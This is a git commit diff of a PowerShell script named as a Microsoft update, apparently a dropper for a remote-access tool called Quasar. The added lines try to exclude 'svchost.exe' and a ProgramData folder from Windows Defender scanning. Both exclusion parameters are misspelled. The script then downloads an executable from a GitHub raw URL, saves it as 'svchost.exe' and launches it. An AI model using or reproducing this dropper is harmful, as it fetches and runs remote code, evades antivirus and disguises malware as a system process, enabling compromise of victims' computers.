1d52ddf40c7025552475375febfd787402b5a58b
ErrorLoadingUsername-404 <101419715+ErrorLoadingUsername-404@users.noreply.github.com>
2022-07-10 07:55:14 -0700

    Update microsoftupdatequasar.ps1

--- microsoftupdatequasar.ps1
+++ microsoftupdatequasar.ps1
@@ -1,7 +1,10 @@
+Add-MpPreference -ExclusionPrcoess "svchost.exe"
+Add-MpPreference -ExlcusionPath "C:\ProgramData\zDATAxD"
+mkdir C:\ProgramData\zDATAxD
 cd C:\programdata\zdataxd
 mkdir quasar
 cd quasar
-$source = 'https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/MicrosoftAutoUpdate.exe'
-$destination = 'C:\ProgramData\zDATAxD\quasar\MicrosoftAutoUpdate.exe'
+$source = 'https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/svchost.exe'
+$destination = 'C:\ProgramData\zDATAxD\quasar\svchost.exe'
 Invoke-WebRequest -Uri $source -OutFile $destination
-start C:\programdata\zdataxd\quasar\MicrosoftAutoUpdate.exe
+start C:\programdata\zdataxd\quasar\svchost.exe
